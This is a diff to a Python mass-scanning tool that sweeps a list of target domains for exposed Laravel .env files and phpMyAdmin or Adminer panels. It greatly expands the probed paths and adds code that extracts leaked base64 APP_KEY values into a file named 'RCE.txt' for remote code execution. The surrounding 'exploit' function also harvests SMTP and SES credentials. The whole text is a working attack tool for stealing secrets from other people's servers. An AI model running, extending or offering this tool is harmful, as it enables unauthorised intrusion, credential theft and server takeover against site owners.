@@ -32,17 +32,198 @@ print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one
 print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")
 
 path = [
-    "/.env", "/vendor/.env", "/lib/.env", "/lab/.env", "/cronlab/.env", "/cron/.env", "/core/.env", "/core/app/.env",
-    "/core/Database/.env", "/database/.env", "/config/.env", "/assets/.env", "/app/.env", "/apps/.env", "/uploads/.env",
-    "/sitemaps/.env", "/site/.env", "/admin/.env", "/web/.env", "/public/.env", "/en/.env", "/tools/.env", "/v1/.env",
-    "/administrator/.env", "/laravel/.env"
+    "/.env",
+    "/.env.bak",
+    "/.env.backup",
+    "/.env.save",
+    "/.env.old",
+    "/.env~",
+    "/.env.txt",
+    "/.env.example",
+    "/.env.prod",
+    "/.env.production",
+    "/.env.dev",
+    "/.env.development",
+    "/.env.local",
+    "/.env.test",
+    "/.env.testing",
+    "/.env.stage",
+    "/.env.staging",
+    "/.env1",
+    "/.env2",
+    "/.env_copy",
+    "/.env_copy.txt",
+    "/.env.back",
+    "/.env.bkp",
+    "/.env_orig",
+    "/.env.original",
+    "/.env.save",
+    "/.env.save.1",
+    "/.env.save.2",
+    "/.env.save.old",
+    "/.env.save.bak",
+    "/.env.save.bkp",
+    "/.env.save.txt",
+    "/.env.save~",
+    "/.env.save.old",
+    "/.env.save.backup",
+    "/.env.save.example",
+    "/.env.save.prod",
+    "/.env.save.production",
+    "/.env.save.dev",
+    "/.env.save.development",
+    "/.env.save.local",
+    "/.env.save.test",
+    "/.env.save.testing",
+    "/.env.save.stage",
+    "/.env.save.staging",
+    "/vendor/.env",
+    "/lib/.env",
+    "/lab/.env",
+    "/cronlab/.env",
+    "/cron/.env",
+    "/core/.env",
+    "/core/app/.env",
+    "/core/Database/.env",
+    "/database/.env",
+    "/config/.env",
+    "/assets/.env",
+    "/app/.env",
+    "/apps/.env",
+    "/uploads/.env",
+    "/sitemaps/.env",
+    "/site/.env",
+    "/admin/.env",
+    "/web/.env",
+    "/public/.env",
+    "/en/.env",
+    "/tools/.env",
+    "/v1/.env",
+    "/administrator/.env",
+    "/laravel/.env",
+    "/api/.env",
+    "/backend/.env",
+    "/backend/web/.env",
+    "/backend/app/.env",
+    "/backend/config/.env",
+    "/backend/database/.env",
+    "/backend/core/.env",
+    "/backend/admin/.env",
+    "/backend/public/.env",
+    "/backend/assets/.env",
+    "/backend/uploads/.env",
+    "/backend/site/.env",
+    "/backend/tools/.env",
+    "/backend/vendor/.env",
+    "/backend/lib/.env",
+    "/backend/lab/.env",
+    "/backend/cronlab/.env",
+    "/backend/cron/.env",
+    "/backend/core/app/.env",
+    "/backend/core/Database/.env",
+    "/backend/sitemaps/.env",
+    "/backend/en/.env",
+    "/backend/v1/.env",
+    "/backend/administrator/.env",
+    "/backend/laravel/.env"
 ]
 
 phpmyadmin_paths = [
-    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
+    "/phpmyadmin/",
+    "/phpMyAdmin/",
+    "/pma/",
+    "/PMA/",
+    "/dbadmin/",
+    "/mysql/",
+    "/myadmin/",
+    "/phpmyadmin2/",
+    "/phpMyAdmin2/",
+    "/phpmyadmin3/",
+    "/phpMyAdmin3/",
+    "/phpmyadmin4/",
+    "/phpMyAdmin4/",
+    "/phpmyadmin5/",
+    "/phpMyAdmin5/",
+    "/phpmyadmin-2/",
+    "/phpmyadmin-3/",
+    "/phpmyadmin-4/",
+    "/phpmyadmin-5/",
+    "/phpmyadmin-old/",
+    "/phpmyadmin-old2/",
+    "/phpmyadmin-old3/",
+    "/phpmyadmin-old4/",
+    "/phpmyadmin-old5/",
+    "/phpmyadmin.bak/",
+    "/phpmyadmin.bak2/",
+    "/phpmyadmin.bak3/",
+    "/phpmyadmin.bak4/",
+    "/phpmyadmin.bak5/",
+    "/phpmyadmin_backup/",
+    "/phpmyadmin_backup2/",
+    "/phpmyadmin_backup3/",
+    "/phpmyadmin_backup4/",
+    "/phpmyadmin_backup5/",
+    "/phpmyadmin/phpmyadmin/",
+    "/phpMyAdmin/phpMyAdmin/",
+    "/phpmyadmin/phpMyAdmin/",
+    "/phpMyAdmin/phpmyadmin/",
+    "/phpmyadmin-2018/",
+    "/phpmyadmin-2019/",
+    "/phpmyadmin-2020/",
+    "/phpmyadmin-2021/",
+    "/phpmyadmin-2022/",
+    "/phpmyadmin-2023/",
+    "/phpmyadmin-2024/"
 ]
+
 adminer_paths = [
-    "/adminer/", "/adminer.php", "/adm.php"
+    "/adminer/",
+    "/adminer.php",
+    "/adm.php",
+    "/adminer-4.2.5.php",
+    "/adminer-4.3.1.php",
+    "/adminer-4.6.2.php",
+    "/adminer-4.7.0.php",
+    "/adminer-4.7.1.php",
+    "/adminer-4.7.2.php",
+    "/adminer-4.7.3.php",
+    "/adminer-4.7.4.php",
+    "/adminer-4.7.5.php",
+    "/adminer-4.7.6.php",
+    "/adminer-4.7.7.php",
+    "/adminer-4.7.8.php",
+    "/adminer-4.7.9.php",
+    "/adminer-4.8.0.php",
+    "/adminer-4.8.1.php",
+    "/adminer-4.8.2.php",
+    "/adminer-4.8.3.php",
+    "/adminer-4.8.4.php",
+    "/adminer-4.8.5.php",
+    "/adminer-4.8.6.php",
+    "/adminer-4.8.7.php",
+    "/adminer-4.8.8.php",
+    "/adminer-4.8.9.php",
+    "/adminer-4.8.10.php",
+    "/adminer-4.8.11.php",
+    "/adminer-4.8.12.php",
+    "/adminer-4.8.13.php",
+    "/adminer-4.8.14.php",
+    "/adminer-4.8.15.php",
+    "/adminer-4.8.16.php",
+    "/adminer-4.8.17.php",
+    "/adminer-4.8.18.php",
+    "/adminer-4.8.19.php",
+    "/adminer-4.8.20.php",
+    "/adminer-4.8.21.php",
+    "/adminer-4.8.22.php",
+    "/adminer-4.8.23.php",
+    "/adminer-4.8.24.php",
+    "/adminer-4.8.25.php",
+    "/adminer-4.8.26.php",
+    "/adminer-4.8.27.php",
+    "/adminer-4.8.28.php",
+    "/adminer-4.8.29.php",
+    "/adminer-4.8.30.php"
 ]
 
 found_urls = set()
@@ -328,6 +509,25 @@ def get_site_base(site):
         site = site[:-1]
     return site
 
+# --- NEW FUNCTION: Save base64 APP_KEYs to RCE.txt ---
+def save_base64_appkey(url, text):
+    m = re.search(r'^APP_KEY\s*=\s*(base64:[^\s]+)', text, re.MULTILINE)
+    if m:
+        appkey = m.group(1).strip()
+        # Extract base URL (scheme + netloc)
+        base_url = re.match(r'(https?://[^/]+)', url)
+        if base_url:
+            base_url = base_url.group(1)
+        else:
+            base_url = url  # fallback, should not happen
+        with open(f'{RESULTS_DIR}/RCE.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{base_url}|{appkey}\n")
+            f.flush()
+        print(f"{Fore.LIGHTGREEN_EX}[RCE APP_KEY] {base_url}|{appkey}{Style.RESET_ALL}")
+        return True
+    return False
+
+
 def exploit(target):
     if '://' not in target:
         site = 'http://' + target
@@ -351,6 +551,9 @@ def exploit(target):
                         f.write(exploit_path + '\n')
                         f.flush()
                     findings["ENV"] += 1
+
+                    # Save base64 APP_KEYs to RCE.txt
+                    save_base64_appkey(exploit_path, resp.text)
 
                     ses_found = grab_ses_smtp(exploit_path, resp.text)
                     if not ses_found:
